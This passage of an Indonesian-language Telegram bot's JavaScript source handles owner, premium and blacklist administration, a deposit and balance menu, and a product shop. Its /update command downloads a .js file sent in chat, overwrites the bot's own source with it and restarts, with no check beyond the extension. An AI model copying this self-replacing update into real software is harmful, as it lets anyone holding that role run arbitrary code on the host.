<blockquote>👑 𝗢𝘄𝗻𝗲𝗿 𝗕𝗮𝗿𝘂 𝗗𝗶𝘁𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻</blockquote>

🌸 <b>Informasi Owner</b>
➥ <b>ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Aktif

📝 <b>Keterangan:</b> Gunakan <code>/listownjs</code> untuk melihat daftar Owner`, { parse_mode: "HTML" });
});

// === /delownjs ===
bot.onText(/^\/delownjs(?:\s+(\d+))?$/, async (msg, match) => {
  if (!(await cekAkses("ceo", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const targetId = match[1];

  if (!targetId)
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan format:</b> <code>/delownjs [user_id]</code>
➥ <b>Contoh:</b> <code>/delownjs 123456</code>`, { parse_mode: "HTML" });

  const data = loadData();

  if (OWNER_IDS.map(String).includes(String(targetId)))
    return bot.sendMessage(chatId, `
<blockquote>❌ 𝗧𝗶𝗱𝗮𝗸 𝗕𝗶𝘀𝗮 𝗠𝗲𝗻𝗴𝗵𝗮𝗽𝘂𝘀</blockquote>
➥ <b>User ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Owner Utama tidak bisa dihapus`, { parse_mode: "HTML" });

  if (!data.owner?.includes(targetId))
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗢𝘄𝗻𝗲𝗿 𝗧𝗶𝗱𝗮𝗸 𝗗𝗶𝘁𝗲𝗺𝘂𝗸𝗮𝗻</blockquote>
➥ <b>User ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Bukan Owner tambahan`, { parse_mode: "HTML" });

  data.owner = data.owner.filter(id => id !== targetId);
  saveData(data);

  bot.sendMessage(chatId, `
<blockquote>🗑️ 𝗢𝘄𝗻𝗲𝗿 𝗗𝗶𝗵𝗮𝗽𝘂𝘀</blockquote>

🌸 <b>Informasi Owner</b>
➥ <b>ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Dihapus

📝 <b>Keterangan:</b> Gunakan <code>/listownjs</code> untuk melihat daftar terbaru`, { parse_mode: "HTML" });
});

// === /listownjs ===
bot.onText(/^\/listownjs$/, async (msg) => {
  if (!(await cekAkses("ceo", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const owners = loadData().owner || [];

  if (owners.length === 0)
    return bot.sendMessage(chatId, `<blockquote>📋 𝗗𝗮𝗳𝘁𝗮𝗿 𝗢𝘄𝗻𝗲𝗿</blockquote>➥ <b>Status:</b> Tidak ada Owner tambahan yang terdaftar`, { parse_mode: "HTML" });

  const teks = `
<blockquote>👑 𝗗𝗮𝗳𝘁𝗮𝗿 𝗢𝘄𝗻𝗲𝗿 𝗧𝗮𝗺𝗯𝗮𝗵𝗮𝗻</blockquote>

${owners.map((id, i) => `➥ <b>${i + 1}.</b> <code>${id}</code>`).join("\n")}

🌸 <b>Total:</b> ${owners.length} Owner
`;
  bot.sendMessage(chatId, teks, { parse_mode: "HTML" });
});

// === /addakses ===
bot.onText(/^\/addakses(?:\s+(\d+)\s+(\d+)([dh]))?$/, async (msg, match) => {
  if (!(await cekAkses("owner", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const [ , userId, jumlah, satuan ] = match;

  if (!userId || !jumlah || !satuan)
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan format:</b> <code>/addakses [user_id] [durasi][d/h]</code>
➥ <b>Contoh:</b> <code>/addakses 123456 3d</code>
➥ <b>Satuan:</b> d (hari), h (jam)`, { parse_mode: "HTML" });

  const durasi = parseInt(jumlah);
  const now = Math.floor(Date.now() / 1000);
  const detik = satuan === 'd' ? durasi * 86400 : satuan === 'h' ? durasi * 3600 : null;
  if (!detik)
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗦𝗮𝘁𝘂𝗮𝗻 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan:</b> d (hari) atau h (jam) sebagai satuan waktu
➥ <b>Contoh:</b> <code>3d</code> atau <code>24h</code>`, { parse_mode: "HTML" });

  const data = loadData();
  if (!data.premium) data.premium = {};
  const current = data.premium[userId] || now;
  data.premium[userId] = current > now ? current + detik : now + detik;
  saveData(data);

  bot.sendMessage(chatId, `
<blockquote>💎 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗗𝗶𝘁𝗮𝗺𝗯𝗮𝗵𝗸𝗮𝗻</blockquote>

🌸 <b>Informasi Premium</b>
➥ <b>ID:</b> <code>${userId}</code>
➥ <b>Durasi:</b> ${jumlah}${satuan}
➥ <b>Status:</b> Aktif

📝 <b>Keterangan:</b> Gunakan <code>/listakses</code> untuk melihat daftar Premium`, { parse_mode: "HTML" });
});

// === /delakses ===
bot.onText(/^\/delakses(?:\s+(\d+))?$/, async (msg, match) => {
  if (!(await cekAkses("owner", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const userId = match[1];

  if (!userId)
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan format:</b> <code>/delakses [user_id]</code>
➥ <b>Contoh:</b> <code>/delakses 123456</code>`, { parse_mode: "HTML" });

  const data = loadData();
  if (!data.premium?.[userId])
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗨𝘀𝗲𝗿 𝗕𝗲𝗹𝘂𝗺 𝗣𝗿𝗲𝗺𝗶𝘂𝗺</blockquote>
➥ <b>User ID:</b> <code>${userId}</code>
➥ <b>Status:</b> Belum Premium`, { parse_mode: "HTML" });

  delete data.premium[userId];
  saveData(data);

  bot.sendMessage(chatId, `
<blockquote>🗑️ 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝗗𝗶𝗵𝗮𝗽𝘂𝘀</blockquote>

🌸 <b>Informasi Premium</b>
➥ <b>ID:</b> <code>${userId}</code>
➥ <b>Status:</b> Dihapus

📝 <b>Keterangan:</b> Gunakan <code>/listakses</code> untuk memastikan`, { parse_mode: "HTML" });
});

// === /listakses ===
bot.onText(/^\/listakses$/, async (msg) => {
  if (!(await cekAkses("owner", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const data = loadData();
  const now = Math.floor(Date.now() / 1000);

  const teksList = Object.entries(data.premium || {})
    .map(([uid, exp]) => {
      const sisaJam = Math.floor((exp - now) / 3600);
      const sisaHari = Math.floor(sisaJam / 24);
      return sisaJam > 0 ? `➥ <b>👤</b> <code>${uid}</code> — ⏳ ${sisaHari}h ${sisaJam % 24}j tersisa` : null;
    })
    .filter(Boolean)
    .join("\n");

  const teks = teksList ? `
<blockquote>💎 𝗗𝗮𝗳𝘁𝗮𝗿 𝗨𝘀𝗲𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺</blockquote>

${teksList}

🌸 <b>Total:</b> ${Object.keys(data.premium || {}).length} User
` : `<blockquote>📋 𝗗𝗮𝗳𝘁𝗮𝗿 𝗣𝗿𝗲𝗺𝗶𝘂𝗺</blockquote>➥ <b>Status:</b> Belum ada user Premium`;

  bot.sendMessage(chatId, teks, { parse_mode: "HTML" });
});

// === /addbl ===
bot.onText(/^\/addbl(?:\s+(\d+))?$/, async (msg, match) => {
  if (!(await cekAkses("owner", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const targetId = match[1];

  if (!targetId)
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan format:</b> <code>/addbl [user_id]</code>
➥ <b>Contoh:</b> <code>/addbl 123456</code>`, { parse_mode: "HTML" });

  const data = loadData();
  if (!data.blacklist) data.blacklist = [];
  if (data.blacklist.includes(targetId))
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗨𝘀𝗲𝗿 𝗦𝘂𝗱𝗮𝗵 𝗗𝗶𝗯𝗹𝗮𝗰𝗸𝗹𝗶𝘀𝘁</blockquote>
➥ <b>User ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Sudah ada di blacklist`, { parse_mode: "HTML" });

  data.blacklist.push(targetId);
  saveData(data);

  bot.sendMessage(chatId, `
<blockquote>🚫 𝗨𝘀𝗲𝗿 𝗗𝗶𝗯𝗹𝗮𝗰𝗸𝗹𝗶𝘀𝘁</blockquote>

🌸 <b>Informasi Blacklist</b>
➥ <b>ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Ditambahkan

📝 <b>Keterangan:</b> Gunakan <code>/listbl</code> untuk melihat daftar blacklist`, { parse_mode: "HTML" });
});

// === /delbl ===
bot.onText(/^\/delbl(?:\s+(\d+))?$/, async (msg, match) => {
  if (!(await cekAkses("owner", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const targetId = match[1];

  if (!targetId)
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>
➥ <b>Gunakan format:</b> <code>/delbl [user_id]</code>
➥ <b>Contoh:</b> <code>/delbl 123456</code>`, { parse_mode: "HTML" });

  const data = loadData();

  if (!data.blacklist?.includes(targetId))
    return bot.sendMessage(chatId, `
<blockquote>⚠️ 𝗨𝘀𝗲𝗿 𝗧𝗶𝗱𝗮𝗸 𝗗𝗶𝘁𝗲𝗺𝘂𝗸𝗮𝗻</blockquote>
➥ <b>User ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Tidak ditemukan dalam blacklist`, { parse_mode: "HTML" });

  data.blacklist = data.blacklist.filter(id => id !== targetId);
  saveData(data);

  bot.sendMessage(chatId, `
<blockquote>✅ 𝗨𝘀𝗲𝗿 𝗗𝗶𝗵𝗮𝗽𝘂𝘀 𝗱𝗮𝗿𝗶 𝗕𝗹𝗮𝗰𝗸𝗹𝗶𝘀𝘁</blockquote>

🌸 <b>Informasi Blacklist</b>
➥ <b>ID:</b> <code>${targetId}</code>
➥ <b>Status:</b> Dihapus

📝 <b>Keterangan:</b> Gunakan <code>/listbl</code> untuk memastikan`, { parse_mode: "HTML" });
});

// === /listbl ===
bot.onText(/^\/listbl$/, async (msg) => {
  if (!(await cekAkses("owner", msg))) return;
  if (!(await cekGroupOnly(msg, bot))) return;
  const chatId = msg.chat.id;
  const list = loadData().blacklist || [];

  if (list.length === 0)
    return bot.sendMessage(chatId, `<blockquote>📋 𝗗𝗮𝗳𝘁𝗮𝗿 𝗕𝗹𝗮𝗰𝗸𝗹𝗶𝘀𝘁</blockquote>➥ <b>Status:</b> Tidak ada user dalam blacklist`, { parse_mode: "HTML" });

  const teks = `
<blockquote>🚫 𝗗𝗮𝗳𝘁𝗮𝗿 𝗕𝗹𝗮𝗰𝗸𝗹𝗶𝘀𝘁</blockquote>

${list.map((id, i) => `➥ <b>${i + 1}.</b> <code>${id}</code>`).join("\n")}

🌸 <b>Total:</b> ${list.length} User
`;
  bot.sendMessage(chatId, teks, { parse_mode: "HTML" });
});

// === /grouponly ===
bot.onText(/^\/grouponly(?:\s+(on|off))?$/, async (msg, match) => {
  if (!(await cekAkses("utama", msg))) return;
  const chatId = msg.chat.id;
  const senderId = msg.from.id.toString();

  const data = loadData();
  const arg = match[1] ? match[1].toLowerCase() : null;

  if (!data.settings) data.settings = {};
  if (arg !== "on" && arg !== "off") {
    const status = data.settings.grouponly ? "✅ Aktif" : "❌ Nonaktif";
    return bot.sendMessage(chatId, `
<blockquote>⚙️ 𝗣𝗲𝗻𝗴𝗮𝘁𝘂𝗿𝗮𝗻 𝗚𝗿𝗼𝘂𝗽𝗢𝗻𝗹𝘆</blockquote>

🌸 <b>Status Saat Ini</b>
➥ <b>Mode:</b> ${status}

📝 <b>Penggunaan</b>
➥ <code>/grouponly on</code> — untuk mengaktifkan
➥ <code>/grouponly off</code> — untuk menonaktifkan`, { parse_mode: "HTML" });
  }

  data.settings.grouponly = arg === "on";
  saveData(data);

  const statusText = arg === "on" ? "✅ GroupOnly diaktifkan" : "❌ GroupOnly dimatikan";
  bot.sendMessage(chatId, `
<blockquote>⚙️ ${statusText}</blockquote>

🌸 <b>Informasi Pengaturan</b>
${arg === "on"
    ? "➥ <b>Mode:</b> Fitur hanya bisa digunakan di grup"
    : "➥ <b>Mode:</b> Fitur bisa digunakan di private chat dan grup"}

📝 <b>Keterangan:</b> Gunakan <code>/grouponly</code> untuk cek status`, { parse_mode: "HTML" });
});

// === /update ===
bot.onText(/^\/update$/, async (msg) => {
  if (!(await cekAkses("utama", msg))) return;

  const chatId = msg.chat.id;
  const username = msg.from.first_name || "User";

  if (!msg.reply_to_message || !msg.reply_to_message.document) {
    return bot.sendMessage(chatId, `
<blockquote>⚙️ 𝗙𝗼𝗿𝗺𝗮𝘁 𝗦𝗮𝗹𝗮𝗵</blockquote>

🌸 <b>Cara menggunakan:</b>
➥ <b>1.</b> Kirim file <code>JS</code>  
➥ <b>2.</b> Reply file tersebut dengan perintah <code>/update</code>

👋 Hai <b>${username}</b> 🌸`, { parse_mode: "HTML" });
  }

  const file = msg.reply_to_message.document;
  const fileId = file.file_id;
  const fileName = file.file_name || "update.js";

  if (!fileName.endsWith(".js")) {
    return bot.sendMessage(chatId, `
<blockquote>❌ 𝗙𝗶𝗹𝗲 𝗧𝗶𝗱𝗮𝗸 𝗩𝗮𝗹𝗶𝗱</blockquote>
➥ <b>File:</b> <code>${fileName}</code>
➥ <b>Status:</b> File harus berekstensi .js`, { parse_mode: "HTML" });
  }

  const tempFile = "./temp_update.js";
  const currentPath = path.resolve(__filename);
  let loadingMessage;

  try {
    loadingMessage = await bot.sendMessage(chatId, `
<blockquote>🔄 𝗠𝗲𝗻𝗴𝘂𝗻𝗱𝘂𝗵 𝗙𝗶𝗹𝗲</blockquote>
➥ <b>Status:</b> Sedang mengunduh file pembaruan...
➥ <b>File:</b> <code>${fileName}</code>`, { parse_mode: "HTML" });
    
    const fileLink = await bot.getFileLink(fileId);

    const frames = ["🔄", "⏳", "🌀", "💫"];
    let frameIndex = 0;
    
    const loadingInterval = setInterval(async () => {
      try {
        await bot.editMessageText(
          `<blockquote>${frames[frameIndex]} 𝗠𝗲𝗺𝗽𝗿𝗼𝘀𝗲𝘀 𝗨𝗽𝗱𝗮𝘁𝗲</blockquote>
➥ <b>Status:</b> Sedang memproses update...
➥ <b>File:</b> <code>${fileName}</code>`,
          {
            chat_id: chatId,
            message_id: loadingMessage.message_id,
            parse_mode: "HTML"
          }
        );
        frameIndex = (frameIndex + 1) % frames.length;
      } catch (err) {}
    }, 1500);

    const response = await axios({
      method: "GET",
      url: fileLink,
      responseType: "stream",
      timeout: 30000,
    });

    const writer = fs.createWriteStream(tempFile);
    response.data.pipe(writer);

    writer.on("finish", async () => {
      clearInterval(loadingInterval);
      
      try {
        const { size } = fs.statSync(tempFile);
        const sizeKB = (size / 1024).toFixed(2);

        await bot.editMessageText(`
<blockquote>✅ 𝗙𝗶𝗹𝗲 𝗕𝗲𝗿𝗵𝗮𝘀𝗶𝗹 𝗗𝗶𝘂𝗻𝗱𝘂𝗵</blockquote>
➥ <b>Status:</b> Memulai proses update sistem...
➥ <b>File:</b> <code>${fileName}</code>`, {
          chat_id: chatId,
          message_id: loadingMessage.message_id,
          parse_mode: "HTML"
        });

        fs.unlinkSync(currentPath);
        fs.renameSync(tempFile, currentPath);

        await bot.editMessageText(`
<blockquote>✅ 𝗨𝗣𝗗𝗔𝗧𝗘 𝗕𝗘𝗥𝗛𝗔𝗦𝗜𝗟</blockquote>

🌸 <b>Detail Update</b>
➥ <b>File:</b> <code>${fileName}</code>  
➥ <b>Ukuran:</b> ${sizeKB} KB  
➥ <b>Oleh:</b> ${username}  
➥ <b>Waktu:</b> ${new Date().toLocaleString("id-ID")}

⚠️ <b>Bot akan restart otomatis dalam 3 detik...</b>`, {
          chat_id: chatId,
          message_id: loadingMessage.message_id,
          parse_mode: "HTML",
        });

        setTimeout(async () => {
          await bot.editMessageText(`
<blockquote>♻️ 𝗦𝗶𝘀𝘁𝗲𝗺 𝗨𝗽𝗱𝗮𝘁𝗲</blockquote>

🌸 <b>Detail Update</b>
➥ <b>File:</b> <code>${fileName}</code>  
➥ <b>Ukuran:</b> ${sizeKB} KB  
➥ <b>Oleh:</b> ${username}  
➥ <b>Waktu:</b> ${new Date().toLocaleString("id-ID")}
➥ <b>Status:</b> ✅ Bot berhasil diperbarui!`, {
            chat_id: chatId,
            message_id: loadingMessage.message_id,
            parse_mode: "HTML",
          });
        }, 2000);

        setTimeout(() => {
          console.log(chalk.hex("#FF4500").bold("[ Restarting Bot... ]"));
          process.exit(0);
        }, 3000);

      } catch (err) {
        clearInterval(loadingInterval);
        console.error("❌ Gagal saat update:", err);
        await bot.editMessageText(`
<blockquote>❌ 𝗚𝗮𝗴𝗮𝗹 𝗨𝗽𝗱𝗮𝘁𝗲</blockquote>
➥ <b>Error:</b> Terjadi kesalahan saat mengganti file bot
➥ <b>Solusi:</b> Pastikan bot punya izin tulis di folder ini`, {
          chat_id: chatId,
          message_id: loadingMessage.message_id,
          parse_mode: "HTML"
        });
      }
    });

    writer.on("error", async (err) => {
      clearInterval(loadingInterval);
      console.error("❌ Gagal menulis file:", err);
      await bot.editMessageText(`
<blockquote>❌ 𝗚𝗮𝗴𝗮𝗹 𝗠𝗲𝗻𝗴𝘂𝗻𝗱𝘂𝗵</blockquote>
➥ <b>Error:</b> Terjadi error saat menulis file update
➥ <b>Solusi:</b> Pastikan koneksi stabil lalu coba ulang`, {
        chat_id: chatId,
        message_id: loadingMessage.message_id,
        parse_mode: "HTML"
      });
    });

  } catch (err) {
    console.error("❌ Error update:", err);
    if (loadingMessage) {
      await bot.editMessageText(`
<blockquote>❌ 𝗨𝗽𝗱𝗮𝘁𝗲 𝗚𝗮𝗴𝗮𝗹</blockquote>
➥ <b>Error:</b> Terjadi error tidak terduga
➥ <b>Solusi:</b> Pastikan file JS valid dan coba lagi`, {
        chat_id: chatId,
        message_id: loadingMessage.message_id,
        parse_mode: "HTML"
      });
    } else {
      await bot.sendMessage(chatId, `
<blockquote>❌ 𝗨𝗽𝗱𝗮𝘁𝗲 𝗚𝗮𝗴𝗮𝗹</blockquote>
➥ <b>Error:</b> Terjadi error tidak terduga
➥ <b>Solusi:</b> Pastikan file JS valid dan coba lagi`, { parse_mode: "HTML" });
    }
  }
});

// === /deposit === 
bot.onText(/^\/deposit$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  
  depositSessions[userId] = { waitingForCustomAmount: true };

  const text = `
<blockquote>💳 𝗗𝗘𝗣𝗢𝗦𝗜𝗧 𝗦𝗘𝗞𝗔𝗥𝗔𝗡𝗚</blockquote>

💰 <b>Pilih Nominal Deposit:</b>
➥ Deposit cepat dengan nominal yang tersedia

<code>────────────────────</code>
💠 <b>Minimal Deposit:</b> Rp ${PAYMENT_SETTINGS.MIN_DEPOSIT.toLocaleString('id-ID')}
  `;

  await bot.sendMessage(chatId, text, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '💰 10K', callback_data: 'deposit_10000' },
          { text: '💰 25K', callback_data: 'deposit_25000' },
          { text: '💰 50K', callback_data: 'deposit_50000' }
        ],
        [
          { text: '💰 100K', callback_data: 'deposit_100000' },
          { text: '💰 250K', callback_data: 'deposit_250000' },
          { text: '💰 500K', callback_data: 'deposit_500000' }
        ],
        [
          { text: '📝 Custom Amount', callback_data: 'deposit_custom' }
        ],
        [
          { text: '💳 Cek Saldo', callback_data: 'cek_saldo' },
          { text: '🛍️ Lihat Produk', callback_data: 'lihat_produk' }
        ]
      ]
    }
  });
});

// === /ceksaldo === 
bot.onText(/^\/ceksaldo$/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id.toString();
  const user = initializeUser(userId, msg.from);
  
  const text = `
<blockquote>💳 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗦𝗔𝗟𝗗𝗢</blockquote>

👤 <b>User:</b> ${msg.from.first_name}
💰 <b>Saldo:</b> <code>Rp ${user.balance.toLocaleString('id-ID')}</code>
📅 <b>Update:</b> ${new Date().toLocaleString('id-ID')}

<code>────────────────────</code>
💎 <i>Saldo dapat digunakan untuk membeli produk</i>
  `;

  await bot.sendMessage(chatId, text, {
    parse_mode: 'HTML',
    reply_markup: {
      inline_keyboard: [
        [
          { text: '💳 Deposit', callback_data: 'deposit_menu' },
          { text: '🛍️ Beli Produk', callback_data: 'lihat_produk' }
        ],
        [
          { text: '🔄 Refresh Saldo', callback_data: 'refresh_saldo' }
        ]
      ]
    }
  });
});

// === /stock === 
bot.onText(/^\/stock$/, async (msg) => {
  await showStockList(msg.chat.id, null, msg.from);
});

// === /buy === 
bot.onText(/^\/buy$/, async (msg) => {
  await showStockList(msg.chat.id, null, msg.from);
});

// === SHOW STOCK LIST FUNCTION ===
async function showStockList(chatId, messageId = null, userInfo = null) {
  const products = Object.values(productDB.products);
  const availableProducts = products.filter(p => p.stock > 0);
  
  if (availableProducts.length === 0) {
    const text = `
<blockquote>📦 𝗦𝗘𝗠𝗨𝗔 𝗣𝗥𝗢𝗗𝗨𝗞 𝗛𝗔𝗕𝗜𝗦</blockquote>

😔 <b>Maaf, semua produk sedang habis</b>
➥ <b>Status:</b> Stok kosong
➥ <b>Total Produk:</b> ${products.length} produk
➥ <b>Produk Tersedia:</b> 0 produk

<code>────────────────────</code>
📞 <i>Silakan hubungi admin untuk info restock</i>
    `;
    
    if (messageId) {
      try {
        await bot.editMessageText(text, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '🔄 Refresh Stok', callback_data: 'refresh_stock' },
                { text: '💳 Deposit', callback_data: 'deposit_menu' }
              ],
              [
                { text: '💳 Cek Saldo', callback_data: 'cek_saldo' }
              ]
            ]
          }
        });
      } catch (error) {
        await bot.sendMessage(chatId, text, { 
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [
                { text: '🔄 Refresh Stok', callback_data: 'refresh_stock' },
                { text: '💳 Deposit', callback_data: 'deposit_menu' }
              ],
              [
                { text: '💳 Cek Saldo', callback_data: 'cek_saldo' }
              ]
            ]
          }
        });
      }
    } else {
      await bot.sendMessage(chatId, text, { 
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [
              { text: '🔄 Refresh Stok', callback_data: 'refresh_stock' },
              { text: '💳 Deposit', callback_data: 'deposit_menu' }
            ],
            [
              { text: '💳 Cek Saldo', callback_data: 'cek_saldo' }
            ]
          ]
        }
      });
    }
    return;
  }

  const keyboard = [];
 
  for (let i = 0; i < availableProducts.length; i += 2) {
    const row = [];
    if (availableProducts[i]) {
      const status = availableProducts[i].stock <= 5 ? '🟡' : '🟢';
      row.push({
        text: `${status} ${availableProducts[i].name}`,
        callback_data: `product_${availableProducts[i].id}`
      });
    }
    if (availableProducts[i + 1]) {
      const status = availableProducts[i + 1].stock <= 5 ? '🟡' : '🟢';
      row.push({
        text: `${status} ${availableProducts[i + 1].name}`,
        callback_data: `product_${availableProducts[i + 1].id}`
      });
    }
    keyboard.push(row);
  }

  keyboard.push([
    { text: '🔄 Refresh', callback_data: 'refresh_stock' }
  ]);
  keyboard.push([
    { text: '💳 Deposit', callback_data: 'deposit_menu' },
    { text: '💰 Cek Saldo', callback_data: 'cek_saldo' }
  ]);

  const totalProducts = products.length;
  const totalStock = availableProducts.reduce((sum, p) => sum + p.stock, 0);
  const outOfStock = products.length - availableProducts.length;

  const text = `
<blockquote>🛍️ 𝗗𝗔𝗙𝗧𝗔𝗥 𝗣𝗥𝗢𝗗𝗨𝗞</blockquote>

📊 <b>Statistik Toko:</b>
➥ <b>Total Produk:</b> ${totalProducts}
➥ <b>Produk Ready:</b> ${availableProducts.length}
➥ <b>Stok Tersedia:</b> ${totalStock} item
➥ <b>Produk Habis:</b> ${outOfStock}

<code>────────────────────</code>
🟢 <b>Tersedia</b> | 🟡 <b>Menipis</b>
➥ <b>Klik produk untuk membeli</b>
  `;

  if (messageId) {
    try {
      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
      });
    } catch (error) {
      await bot.sendMessage(chatId, text, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
      });
    }
  } else {
    await bot.sendMessage(chatId, text, {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: keyboard }
    });
  }
}

// === SHOW PRODUCT DETAIL FUNCTION ===
async function showProductDetail(chatId, userId, productId, messageId = null) {
  const product = productDB.products[productId];
  if (!product) {
    const text = `
<blockquote>❌ 𝗣𝗥𝗢𝗗𝗨𝗞 𝗧𝗜𝗗𝗔𝗞 𝗗𝗜𝗧𝗘𝗠𝗨𝗞𝗔𝗡</blockquote>
➥ <b>Status:</b> Produk tidak ditemukan
    `;
    
    if (messageId) {
      try {
        await bot.editMessageText(text, {
          chat_id: chatId,
          message_id: messageId,
          parse_mode: 'HTML',
          reply_markup: {
            inline_keyboard: [
              [{ text: '📋 Kembali ke List', callback_data: 'kembali_list' }]
            ]
          }
        });
      } catch (error) {
        await bot.sendMessage(chatId, text, { parse_mode: 'HTML' });
      }
    } else {
      await bot.sendMessage(chatId, text, { parse_mode: 'HTML' });
    }
    return;
  }

  const user = initializeUser(userId);
  const status = product.stock === 0 ? '🔴 HABIS' : 
                product.stock <= 5 ? '🟡 MENIPIS' : '🟢 TERSEDIA';

  const text = `
<blockquote>📋 𝗗𝗘𝗧𝗔𝗜𝗟 𝗣𝗥𝗢𝗗𝗨𝗞</blockquote>

🏷️ <b>Nama:</b> ${product.name}
🆔 <b>ID:</b> <code>${product.id}</code>
💰 <b>Harga:</b> <code>Rp ${product.price.toLocaleString('id-ID')}</code>
📦 <b>Stok:</b> ${product.stock} unit
🎯 <b>Status:</b> ${status}

<code>────────────────────</code>
📝 <b>Deskripsi:</b>
${product.description}

<code>────────────────────</code>
👤 <b>Saldo Anda:</b> <code>Rp ${user.balance.toLocaleString('id-ID')}</code>
  `;

  const keyboard = [];
  
  if (product.stock > 0) {
  
    const maxQty = Math.min(product.stock, 4);
    for (let i = 1; i <= maxQty; i += 2) {
      const row = [];
      row.push({
        text: `🛒 ${i} Unit`,
        callback_data: `buy_${productId}_${i}`
      });
      if (i + 1 <= maxQty) {
        row.push({
          text: `🛒 ${i + 1} Unit`,
          callback_data: `buy_${productId}_${i + 1}`
        });
      }
      keyboard.push(row);
    }
  } else {
    keyboard.push([
      { text: '🔴 Stok Habis', callback_data: 'stok_habis' }
    ]);
  }

  keyboard.push([
    { text: '📋 Kembali', callback_data: 'kembali_list' }
  ]);
  keyboard.push([
    { text: '💳 Deposit', callback_data: 'deposit_menu' },
    { text: '💰 Saldo', callback_data: 'cek_saldo' }
  ]);

  if (messageId) {
    try {
      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
      });
    } catch (error) {
      await bot.sendMessage(chatId, text, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: keyboard }
      });
    }
  } else {
    await bot.sendMessage(chatId, text, {
      parse_mode: 'HTML',
      reply_markup: { inline_keyboard: keyboard }
    });
  }
}

// === PROCESS BUY FUNCTION ===
async function processBuy(chatId, userId, productId, qty, userInfo, messageId = null) {
  const user = initializeUser(userId, userInfo);
  const product = productDB.products[productId];
  
  if (!product) {
    const text = `
<blockquote>❌ 𝗣𝗥𝗢𝗗𝗨𝗞 𝗧𝗜𝗗𝗔𝗞 𝗗𝗜𝗧𝗘𝗠𝗨𝗞𝗔𝗡</blockquote>
➥ <b>Status:</b> Produk tidak ditemukan
    `;

    if (messageId) {
      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML'
      });
    } else {
      await bot.sendMessage(chatId, text, { parse_mode: 'HTML' });
    }
    return;
  }

  if (product.stock < qty) {
    const text = `
<blockquote>⚠️ 𝗦𝗧𝗢𝗞 𝗧𝗜𝗗𝗔𝗞 𝗖𝗨𝗞𝗨𝗣</blockquote>
➥ <b>Stok Tersedia:</b> ${product.stock}
➥ <b>Yang Dibutuhkan:</b> ${qty}
    `;

    if (messageId) {
      await bot.editMessageText(text, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📋 Kembali', callback_data: `product_${productId}` }]
          ]
        }
      });
    } else {
      await bot.sendMessage(chatId, text, { 
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '📋 Kembali', callback_data: `product_${productId}` }]
          ]
        }
      });
    }
    return;
  }

  const total = product.price * qty;
  if (user.balance < total) {
    const text = `
<blockquote>💳 𝗦𝗔𝗟𝗗𝗢 𝗧𝗜𝗗𝗔𝗞 𝗖𝗨𝗞𝗨𝗣</blockquote>
➥ <b>Total:</b> <code>Rp ${total.toLocaleString('id-ID')}</code>
➥ <b>Saldo Kamu:</b> <code>Rp ${user.balance.toLocaleString('id-ID')}</code>

<code>────────────────────</code>
💎 <i>Silakan deposit terlebih dahulu</i>
    `;

    if (messageId) {
